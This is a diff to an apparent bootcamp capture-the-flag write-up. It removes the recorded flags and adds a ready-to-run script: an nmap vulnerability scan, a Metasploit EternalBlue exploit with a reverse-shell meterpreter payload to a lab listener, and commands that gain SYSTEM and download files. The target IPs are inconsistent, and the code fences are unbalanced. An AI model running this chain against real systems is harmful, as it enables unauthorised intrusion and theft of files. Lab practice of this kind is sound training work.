@@ -482,14 +482,39 @@ Anonymous FTP revealed a `comms.rtf` file in `Regular logs/all logs/` containing
 
 hashbrowns1.txt and hide.jpeg was located in C:\Users\Public\Documents\ and Hoot.txt was located in C:\Users\Ninja\Desktop\:
 
-```txt
-    hASHbrowns1.txt= 07ef879175424a11fbc65e95737df3df8822b8a6 
+
+so if i were to preload a script for this challenge, it would be something like this:
+
+```bash
+#!/bin/bash
+# Preload script for Final Bootcamp Simulation
+TARGET_IP="10.0.2.4"
+# Step 1: Nmap scan
+nmap -sS -sV -O --script=vuln $TARGET_IP -oN nmap_scan.txt
+# Step 2: Exploit EternalBlue with Metasploit
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET_IP; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.2.0.5; run" > msf_exploit.txt
+# Step 3: Post-exploitation commands to retrieve files
+
+#or for rapid copy paste
+
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.2.0.4
+set LHOST 10.2.0.5
+exploit
+
+# msfconsole (with noted locations for download and directory crawling)
+# meterpreter > cd C:\Users\Ninja\Desktop\
+# meterpreter > download Hoot.txt 
+# meterpreter > cd C:\Users\Public\Documents\
+# meterpreter > download hashbrowns1.txt
+# meterpreter > download hide.jpeg
 ```
-
-(hide.jpeg is a picture of batman)
-
-```txt
-Hoot.txt = RootFlag{061713fa2ad376430ac11555d1895f97876dc58f}
+getsystem
+cd C:\Users\Ninja\Desktop\
+download Hoot.txt
+cd C:\Users\Public\Documents\
+download hashbrowns1.txt
+download hide.jpeg
+background
 ````
 
-3 flags in 4 hours :D and now we just have to document everything and make a presentation.
